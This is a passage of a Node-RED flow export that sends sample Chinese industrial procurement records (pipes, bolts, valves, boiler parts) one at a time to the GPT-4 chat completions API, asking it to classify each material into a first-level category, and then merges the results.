        "x": 140.66668701171875,
        "y": 787.3333740234375,
        "wires": [
            [
                "805d342f920109cb"
            ]
        ]
    },
    {
        "id": "a84ba8a1069a61eb",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 10",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "loop.index",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 480.66668701171875,
        "y": 867.3333740234375,
        "wires": []
    },
    {
        "id": "d59aa9eb79c49f7c",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "GPT",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://api.openai.com/v1/chat/completions",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "bearer",
        "senderr": false,
        "headers": [
            {
                "keyType": "Content-Type",
                "keyValue": "",
                "valueType": "application/json",
                "valueValue": ""
            }
        ],
        "x": 490,
        "y": 1040,
        "wires": [
            [
                "eb1ac038eeeeeab0",
                "6e17550e6db97354"
            ]
        ]
    },
    {
        "id": "eb1ac038eeeeeab0",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 15",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 640,
        "y": 1040,
        "wires": []
    },
    {
        "id": "0544eb4efc62732c",
        "type": "json",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 150,
        "y": 1040,
        "wires": [
            [
                "3e03652765d82d3e"
            ]
        ]
    },
    {
        "id": "3e03652765d82d3e",
        "type": "function-gpt",
        "z": "a29fcfb6f0cac7dd",
        "name": "function-gpt 6",
        "config": "44c9c8af11a9f982",
        "func": "// 确保msg.payload是可以迭代的\nif (msg.payload && typeof msg.payload === 'object' && !Array.isArray(msg.payload)) {\n    // 如果msg.payload是对象，则取其值作为数组\n    msg.payload = Object.values(msg.payload);\n} else if (!Array.isArray(msg.payload)) {\n    // 如果msg.payload不是对象也不是数组，则将其放入数组中\n    msg.payload = [msg.payload];\n}\n\n// 使用.map方法生成新的消息数组\nlet messagesToSend = msg.payload.map(value => {\n    return {\n        payload: {\n            model: \"gpt-4\",\n            messages: [{\n                role: 'user',\n                content: '尝试理解以下一级类目的含义和特点，括号中的是解释：工业检测,实验室产品,安防消防,电线电缆,电工器材,配电及控制元件,工业自动化,工具,照明,办公用品,通信设备,劳动防护,清洁用品及设备,控制系统,现场仪表,计算机及外设,盘装仪表,机械,工具耗材,存储,量具,焊接,刀具,搬运,紧固,密封,制冷|暖通|通风除尘,包材,胶粘,润滑,车间化学品,泵管阀,工位,建筑材料,轴承。综合我输入的JSON信息，那将是包含一些工业用产品物料的信息，然后根据你的综合理解，推测它最可能属于哪一个一级类目，要按照物品本身的属性推测，而不要依据使用场景或其所属系统分类。如果你很不确定属于哪类，则分为“人工”类。最终输出item描述和对应类别的JSON，你给我的回答应该只包括最后的JSON，以下是我的输入JSON:'+ value\n            }]\n        }\n    };\n});\n\n// 将要发送的消息数组存储在流的上下文中，以便跨消息调用持久化\nflow.set(\"messagesToSend\", messagesToSend);\n\n// 调用发送函数\nsendNext();\n\n// 定义发送函数\nfunction sendNext() {\n    let messages = flow.get(\"messagesToSend\") || [];\n    let nextMessage = messages.shift(); // 获取数组中的下一条消息\n    flow.set(\"messagesToSend\", messages); // 更新剩余消息数组\n    if (nextMessage) {\n        node.send(nextMessage); // 发送消息\n        // 如果还有消息要发送，调用此函数来延迟下一次发送\n        if (messages.length > 0) {\n            setTimeout(sendNext, 5000); // 5秒后再次发送\n        }\n    }\n}\n\nreturn null; // 防止在输出中直接发送任何消息\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 320,
        "y": 1040,
        "wires": [
            [
                "d59aa9eb79c49f7c"
            ]
        ]
    },
    {
        "id": "cd9618beecab36cd",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "{\"到货日期\":\"2023-03-21T00:00:00.000Z\",\"采购订单号\":4500018770,\"采购行项目\":50,\"物料编码\":\"WL0708000000003100237\",\"物料描述\":\"\\\"\\n电排  KCS-100A\\n\\\"\",\"备注\":\"由诺圣设备维保，空气干燥机专用配件，现因故障没有运行，气动阀生产影响严重。\",\"到货基本计量单位\":\"个\",\"采购订单含税单价\":1120}",
        "payloadType": "json",
        "x": 170,
        "y": 980,
        "wires": [
            [
                "0544eb4efc62732c"
            ]
        ]
    },
    {
        "id": "ce5bfecbde9e27f8",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 16",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "origin",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 620,
        "y": 960,
        "wires": []
    },
    {
        "id": "6e17550e6db97354",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 8",
        "func": "var jsonObj\nvar temp\n// try {\njsonObj = JSON.parse(msg.payload);\nmsg.temp = jsonObj.choices[0].message.content\n\n// } \n// catch (error) {\n// }\n// if (temp != undefined) {\n    msg.msg = temp\n\n// }\n//     var jsonTmep = JSON.parse(msg.origin);\n//     jsonTmep[\"类别\"] = msg.msg\n\n//     return msg;\n\n\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 520,
        "y": 1100,
        "wires": [
            [
                "44736215e2e7e778",
                "dc0ad5b9ead5863c"
            ]
        ]
    },
    {
        "id": "44736215e2e7e778",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 17",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "temp",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 590,
        "y": 1160,
        "wires": []
    },
    {
        "id": "dc0ad5b9ead5863c",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 18",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "msg",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 370,
        "y": 1240,
        "wires": []
    },
    {
        "id": "6a7c4c9307a1b2c5",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 9",
        "func": "flow.set(\"payload\",msg.payload)\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 340,
        "y": 440,
        "wires": [
            [
                "391868047aa620e2"
            ]
        ]
    },
    {
        "id": "8ec00784fb9c2359",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 10",
        "func": "var temp = msg.payload\nflow.set(\"origin\", temp)\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 290,
        "y": 380,
        "wires": [
            [
                "40da5c25898d2e06"
            ]
        ]
    },
    {
        "id": "da59a760018fba13",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 21",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "result",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 700,
        "y": 480,
        "wires": []
    },
    {
        "id": "8ad4a9cbbb3582c8",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 23",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "resultNew",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 720,
        "y": 440,
        "wires": []
    },
    {
        "id": "06bcd53fc01071b8",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 24",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 660,
        "y": 540,
        "wires": []
    },
    {
        "id": "4541f905cf17a4e2",
        "type": "http request",
        "z": "a29fcfb6f0cac7dd",
        "name": "GPT",
        "method": "POST",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "https://api.openai.com/v1/chat/completions",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "bearer",
        "senderr": false,
        "headers": [
            {
                "keyType": "Content-Type",
                "keyValue": "",
                "valueType": "application/json",
                "valueValue": ""
            }
        ],
        "x": 380,
        "y": 1720,
        "wires": [
            [
                "ff37559dda4e26c6"
            ]
        ]
    },
    {
        "id": "c7aa88d21e7f8000",
        "type": "function-gpt",
        "z": "a29fcfb6f0cac7dd",
        "name": "function-gpt 7",
        "config": "44c9c8af11a9f982",
        "func": "// 确保msg.payload是可以迭代的\nif (msg.payload && typeof msg.payload === 'object' && !Array.isArray(msg.payload)) {\n    // 如果msg.payload是对象，则取其值作为数组\n    msg.payload = Object.values(msg.payload);\n} else if (!Array.isArray(msg.payload)) {\n    // 如果msg.payload不是对象也不是数组，则将其放入数组中\n    msg.payload = [msg.payload];\n}\n\n// 使用.map方法生成新的消息数组\nlet messagesToSend = msg.payload.map(value => {\n    return {\n        payload: {\n            model: \"gpt-4\",\n            messages: [{\n                role: 'user',\n                content: '尝试理解以下一级类目的含义和特点，括号中的是解释：工业检测,实验室产品,安防消防,电线电缆,电工器材,配电及控制元件,工业自动化,工具,照明,办公用品,通信设备,劳动防护,清洁用品及设备,控制系统,现场仪表,计算机及外设,盘装仪表,机械,工具耗材,存储,量具,焊接,刀具,搬运,紧固,密封,制冷|暖通|通风除尘,包材,胶粘,润滑,车间化学品,泵管阀,工位,建筑材料,轴承。综合我输入的JSON信息，那将是包含一些工业用产品物料的信息，然后根据你的综合理解，推测它最可能属于哪一个一级类目，要按照物品本身的属性推测，而不要依据使用场景或其所属系统分类。如果你很不确定属于哪类，则分为“人工”类。最终输出item描述和对应类别的JSON，格式遵循\"物料名称:,一级类目：“，你给我的回答应该只包括最后的JSON，以下是我的输入JSON:' + value\n            }]\n        }\n    };\n});\n\n// 将要发送的消息数组存储在流的上下文中，以便跨消息调用持久化\nflow.set(\"messagesToSend\", messagesToSend);\n\n// 调用发送函数\nsendNext();\n\n// 定义发送函数\nfunction sendNext() {\n    let messages = flow.get(\"messagesToSend\") || [];\n    let nextMessage = messages.shift(); // 获取数组中的下一条消息\n    flow.set(\"messagesToSend\", messages); // 更新剩余消息数组\n    if (nextMessage) {\n        node.send(nextMessage); // 发送消息\n        // 如果还有消息要发送，调用此函数来延迟下一次发送\n        if (messages.length > 0) {\n            setTimeout(sendNext, 5000); // 5秒后再次发送\n        }\n    }\n}\n\nreturn null; // 防止在输出中直接发送任何消息\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 1170,
        "y": 1660,
        "wires": [
            [
                "4541f905cf17a4e2"
            ]
        ]
    },
    {
        "id": "3ce29e6eb7588f2b",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "[  {     \"到货日期\": \"2023-07-24T00:00:00.000Z\",     \"采购订单号\": 4500022829,     \"采购行项目\": 30,     \"物料编码\": \"WL1002001000003120001\",     \"物料描述\": \"2205不锈钢管 Φ57×3.5\",     \"备注\": \"3、4#浆液管回流管处更换\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 49.5   },   {     \"到货日期\": \"2022-11-29T00:00:00.000Z\",     \"采购订单号\": 4500016063,     \"采购行项目\": 10,     \"物料编码\": \"WL1002001000003100054\",     \"物料描述\": \"2205不锈钢管 φ76×4\",     \"备注\": \"3、4#进口烟道事故喷淋\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 49   },   {     \"到货日期\": \"2022-04-20T00:00:00.000Z\",     \"采购订单号\": 4500009675,     \"采购行项目\": 10,     \"物料编码\": \"WL1002001000003100035\",     \"物料描述\": \"2205不锈钢焊管57\",     \"备注\": null,     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 41.3   },   {     \"到货日期\": \"2022-04-20T00:00:00.000Z\",     \"采购订单号\": 4500009675,     \"采购行项目\": 20,     \"物料编码\": \"WL1002001000003100026\",     \"物料描述\": \"2205不锈钢焊管89X4\",     \"备注\": null,     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 41.8   },   {     \"到货日期\": \"2023-08-21T00:00:00.000Z\",     \"采购订单号\": 4500023965,     \"采购行项目\": 10,     \"物料编码\": \"WL1201001002013100177\",     \"物料描述\": \"2205不锈钢六角螺栓14x120\",     \"备注\": \"返料螺输用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 25.61   },   {     \"到货日期\": \"2022-07-17T00:00:00.000Z\",     \"采购订单号\": 4500012929,     \"采购行项目\": 60,     \"物料编码\": \"WL1201002002003100022\",     \"物料描述\": \"2205不锈钢螺帽M12\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 2.8   },   {     \"到货日期\": \"2022-07-17T00:00:00.000Z\",     \"采购订单号\": 4500012929,     \"采购行项目\": 70,     \"物料编码\": \"WL1201001002013100128\",     \"物料描述\": \"2205不锈钢螺栓12x45\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 6.6   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500014776,     \"采购行项目\": 150,     \"物料编码\": \"WL1201001002013100142\",     \"物料描述\": \"2205不锈钢螺栓16X70\",     \"备注\": \"带螺母\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 15.8   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500014776,     \"采购行项目\": 160,     \"物料编码\": \"WL1201001002013100143\",     \"物料描述\": \"2205不锈钢螺栓16X80\",     \"备注\": \"带螺母\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 16.5   },   {     \"到货日期\": \"2021-11-19T00:00:00.000Z\",     \"采购订单号\": 4500004391,     \"采购行项目\": 20,     \"物料编码\": \"WL1201001002013100171\",     \"物料描述\": \"2205不锈钢螺栓M12X50mm\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 8.6   },   {     \"到货日期\": \"2022-09-29T00:00:00.000Z\",     \"采购订单号\": 4500014776,     \"采购行项目\": 170,     \"物料编码\": \"WL1201001002013100172\",     \"物料描述\": \"2205不锈钢螺栓M16X90mm\",     \"备注\": \"带螺母\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 17.6   },   {     \"到货日期\": \"2022-10-25T00:00:00.000Z\",     \"采购订单号\": 4500015636,     \"采购行项目\": 10,     \"物料编码\": \"WL1201001002043100011\",     \"物料描述\": \"2205不锈钢双头螺栓  M20×350\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 73.8   },   {     \"到货日期\": \"2022-04-26T00:00:00.000Z\",     \"采购订单号\": 4500010028,     \"采购行项目\": 30,     \"物料编码\": \"WL1105004000003100009\",     \"物料描述\": \"2205不锈钢弯头DN100\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 960   },   {     \"到货日期\": \"2022-04-26T00:00:00.000Z\",     \"采购订单号\": 4500010028,     \"采购行项目\": 10,     \"物料编码\": \"WL1105004000003100003\",     \"物料描述\": \"2205不锈钢弯头DN25\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 95   },   {     \"到货日期\": \"2023-06-15T00:00:00.000Z\",     \"采购订单号\": 4500021861,     \"采购行项目\": 20,     \"物料编码\": \"WL1105004000003100011\",     \"物料描述\": \"2205不锈钢弯头DN50\",     \"备注\": \"备件\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 66   },   {     \"到货日期\": \"2022-10-08T00:00:00.000Z\",     \"采购订单号\": 4500015215,     \"采购行项目\": 70,     \"物料编码\": \"WL1105004000003100005\",     \"物料描述\": \"2205不锈钢弯头DN65\",     \"备注\": \"库存备用\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 260   },   {     \"到货日期\": \"2022-04-26T00:00:00.000Z\",     \"采购订单号\": 4500010028,     \"采购行项目\": 20,     \"物料编码\": \"WL1105004000003100012\",     \"物料描述\": \"2205不锈钢弯头DN80\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 430   },   {     \"到货日期\": \"2022-12-26T00:00:00.000Z\",     \"采购订单号\": 4500016521,     \"采购行项目\": 10,     \"物料编码\": \"WL0901001000003100063\",     \"物料描述\": \"2205热电阻LDWZPKF-430205IT  2205  DN25 350X\",     \"备注\": \"耐腐防震热电阻，LDWZPKF-430205IT,PT100,2205,L=350×250,DN25\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 976   },   {     \"到货日期\": \"2022-04-20T00:00:00.000Z\",     \"采购订单号\": 4500009675,     \"采购行项目\": 30,     \"物料编码\": \"WL1001002000003100001\",     \"物料描述\": \"2205双相不锈钢板S=10MM\",     \"备注\": \"单块面积1.5m*3m\",     \"到货基本计量单位\": \"kg\",     \"采购订单含税单价\": 34.3   },   {     \"到货日期\": \"2022-04-21T00:00:00.000Z\",     \"采购订单号\": 4500007324,     \"采购行项目\": 20,     \"物料编码\": null,     \"物料描述\": \"2209预热器上管箱\",     \"备注\": \"在确定供应商后，可联系采购申请人提供相关参数及其他数据。上管箱材质为2205不锈钢材质。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 80000   },   {     \"到货日期\": \"2023-04-10T00:00:00.000Z\",     \"采购订单号\": 4500016991,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"2211预热器上封头 EHA900X8(图号)\",     \"备注\": \"2组罐211预热器上封头/2205材质\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 85400   },   {     \"到货日期\": \"2023-04-10T00:00:00.000Z\",     \"采购订单号\": 4500016991,     \"采购行项目\": 20,     \"物料编码\": null,     \"物料描述\": \"2213预热器上封头 EHA700X8(图号)\",     \"备注\": \"2组罐213预热器上封头/2205材质\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 73200   },   {     \"到货日期\": \"2022-04-21T00:00:00.000Z\",     \"采购订单号\": 4500007324,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"2214预热器\",     \"备注\": \"整体设备的1/4部分，主要材质为TA10/Q345R\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 136000   },   {     \"到货日期\": \"2023-07-18T00:00:00.000Z\",     \"采购订单号\": 4500023102,     \"采购行项目\": 10,     \"物料编码\": \"WL1202001002003100461\",     \"物料描述\": \"24套筒子加长\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 61   },   {     \"到货日期\": \"2023-07-04T00:00:00.000Z\",     \"采购订单号\": 4500019862,     \"采购行项目\": 10,     \"物料编码\": \"WL1101004000003100076\",     \"物料描述\": \"2507不锈钢球阀DN50 PN16\",     \"备注\": \"（试用）厂家：博雷控制系统有限公司，预热器酸洗管进口球阀（安装一年内出现本体泄漏问题，厂家免费更换）\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 5400   },   {     \"到货日期\": \"2023-05-10T00:00:00.000Z\",     \"采购订单号\": 4500020641,     \"采购行项目\": 10,     \"物料编码\": null,     \"物料描述\": \"2组罐401、402散热片保温衣，厚度5cm\",     \"备注\": \"建议河北中能环、干燥机用此品牌保温衣\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 2287.12   },   {     \"到货日期\": \"2022-07-29T00:00:00.000Z\",     \"采购订单号\": 4500012956,     \"采购行项目\": 40,     \"物料编码\": \"WL0740000000003100117\",     \"物料描述\": \"3#锅炉返料风风帽，附图：2383.702.1\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 110.01   },   {     \"到货日期\": \"2022-03-02T00:00:00.000Z\",     \"采购订单号\": 4500005214,     \"采购行项目\": 20,     \"物料编码\": \"WL0740000000003100111\",     \"物料描述\": \"3#锅炉风帽导管  附图(G2383.702.1-2)\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 123.99   },   {     \"到货日期\": \"2022-03-02T00:00:00.000Z\",     \"采购订单号\": 4500005214,     \"采购行项目\": 10,     \"物料编码\": \"WL0740000000003100102\",     \"物料描述\": \"3#锅炉炉床风帽附图（G2383.702.1-1)\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 210   },   {     \"到货日期\": \"2022-03-02T00:00:00.000Z\",     \"采购订单号\": 4500007815,     \"采购行项目\": 20,     \"物料编码\": \"WL0740000000003100110\",     \"物料描述\": \"3#锅炉水冷壁让管\",     \"备注\": \"四川亚丰\",     \"到货基本计量单位\": \"件\",     \"采购订单含税单价\": 4125   },   {     \"到货日期\": \"2022-07-29T00:00:00.000Z\",     \"采购订单号\": 4500012956,     \"采购行项目\": 30,     \"物料编码\": \"WL0740000000003100116\",     \"物料描述\": \"3#锅炉松动风风帽，附图：2383.702.2\",     \"备注\": \"济南锅炉\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 110.01   },   {     \"到货日期\": \"2022-06-13T00:00:00.000Z\",     \"采购订单号\": 4500008097,     \"采购行项目\": 10,     \"物料编码\": \"WL1202001002003100388\",     \"物料描述\": \"3#炉氨水喷枪YFPQ-6/50\",     \"备注\": \"厂家：四川亚丰电力工程技术有限公司。\",     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 5000   },   {     \"到货日期\": \"2022-10-18T00:00:00.000Z\",     \"采购订单号\": 4500014122,     \"采购行项目\": 50,     \"物料编码\": null,     \"物料描述\": \"3#炉二次风机调节风门\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 122180   },   {     \"到货日期\": \"2022-10-18T00:00:00.000Z\",     \"采购订单号\": 4500014122,     \"采购行项目\": 40,     \"物料编码\": null,     \"物料描述\": \"3#炉二次风机消音器\",     \"备注\": null,     \"到货基本计量单位\": \"个\",     \"采购订单含税单价\": 193640   } ]",
        "payloadType": "json",
        "x": 540,
        "y": 1540,
        "wires": [
            [
                "953fe77197bfc2fc"
            ]
        ]
    },
    {
        "id": "b7d9efb694ef33c6",
        "type": "json",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 1020,
        "y": 1660,
        "wires": [
            [
                "c7aa88d21e7f8000"
            ]
        ]
    },
    {
        "id": "2a4bb85621f41e7a",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 11",
        "func": "var temp =flow.get('origin')\nmsg.origin = temp\n\nmsg.origin = temp[msg.loop.index]\nflow.set(\"temp\",msg.origin)\n\nreturn msg",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 890,
        "y": 1620,
        "wires": [
            []
        ]
    },
    {
        "id": "c26864fee09b6f8a",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 12",
        "func": "\n// msg.payload=flow.get('payload')\nmsg.origin = flow.get('temp')\n\nvar jsonObj\nvar temp\ntry {\njsonObj = JSON.parse(msg.payload);\nmsg.temp = jsonObj.choices[0].message.content\n\n\n\nvar jsonObjTemp = JSON.parse(msg.temp);\n\nif (jsonObjTemp[\"类别\"] != null) {\n    temp = jsonObjTemp[\"类别\"]\n} else if (jsonObjTemp.category != null) {\n    temp = jsonObjTemp.category\n} else if (jsonObjTemp[\"一级类目\"] != null) {\n    temp = jsonObjTemp[\"一级类目\"]\n} else if (jsonObjTemp[\"物料类别\"] != null) {\n    temp = jsonObjTemp[\"物料类别\"]\n}\n\n\n\n} \ncatch (error) {\n}\nif (temp != undefined) {\n    msg.msg = temp\n\n}\nif (msg.origin != null && msg.origin != undefined) {\n    //  var jsonTmep = JSON.parse(msg.origin);\n    var jsonTmep = msg.origin;\n\n    jsonTmep[\"类别\"] = msg.msg\n\n    msg.origin = jsonTmep\n    // msg.temp = flow.get('loop')['enumeration'].length\nif (flow.get('loop').index != 0){\n    msg.result = flow.get('result') + ',' + JSON.stringify(msg.origin);\n    flow.set('result', msg.result)\n\n}else{\n    flow.set('result', JSON.stringify(msg.origin))\n}\n\n    // if (flow.get('loop')['index'] === flow.get('loop')['enumeration'].length-1){\n        msg.resultNew = JSON.parse('[' + flow.get('result') + ']');\n    // }\n\n    return msg;\n}\n\nreturn msg\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 730,
        "y": 1720,
        "wires": [
            [
                "fa73fabd8d292c7b",
                "7492df545d8fd618",
                "bde43ac11120c0fa",
                "ff72d4a0a9c1083c"
            ]
        ]
    },
    {
        "id": "545b0d0f3ed89f3e",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 13",
        "func": "msg.key = flow.get('origin')\nflow.set('loop',msg.loop)\n\nmsg.payload=msg.key[msg.loop.index]\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 890,
        "y": 1660,
        "wires": [
            [
                "b7d9efb694ef33c6"
            ]
        ]
    },
    {
        "id": "ff37559dda4e26c6",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 14",
        "func": "flow.set(\"payload\",msg.payload)\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 550,
        "y": 1720,
        "wires": [
            [
                "c26864fee09b6f8a"
            ]
        ]
    },
    {
        "id": "953fe77197bfc2fc",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 15",
        "func": "var temp = msg.payload\nflow.set(\"origin\", temp)\n\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 500,
        "y": 1660,
        "wires": [
            [
                "fa73fabd8d292c7b"
            ]
        ]
    },
    {
        "id": "7492df545d8fd618",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 25",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "result",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 910,
        "y": 1760,
        "wires": []
    },
    {
        "id": "bde43ac11120c0fa",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 26",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "resultNew",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 930,
        "y": 1720,
        "wires": []
    },
    {
        "id": "ff72d4a0a9c1083c",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 27",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 860,
        "y": 1820,
        "wires": []
    },
    {
        "id": "885162915228ae8d",
        "type": "http in",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "url": "/info",
        "method": "post",
        "upload": true,
        "swaggerDoc": "",
        "x": 210,
        "y": 1440,
        "wires": [
            [
                "960e3dedd90e05ef",
                "6b1d411c7838f4af"
            ]
        ]
    },
    {
        "id": "4d73dc36f2eb4198",
        "type": "debug",
        "z": "a29fcfb6f0cac7dd",
        "name": "debug 28",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 580,
        "y": 1380,
        "wires": []
    },
    {
        "id": "960e3dedd90e05ef",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 16",
        "func": "msg.payload='good'\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 370,
        "y": 1480,
        "wires": [
            [
                "83ebfc324a4b2267"
            ]
        ]
    },
    {
        "id": "83ebfc324a4b2267",
        "type": "http response",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "statusCode": "200",
        "headers": {},
        "x": 570,
        "y": 1480,
        "wires": []
    },
    {
        "id": "6b1d411c7838f4af",
        "type": "function",
        "z": "a29fcfb6f0cac7dd",
        "name": "function 17",
        "func": "return msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 350,
        "y": 1380,
        "wires": [
            [
                "4d73dc36f2eb4198",
                "953fe77197bfc2fc"
            ]
        ]
    },
    {
        "id": "24fb8c9b30c606e7",
        "type": "inject",
        "z": "a29fcfb6f0cac7dd",
        "name": "",
        "props": [
            {
                "p": "payload"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
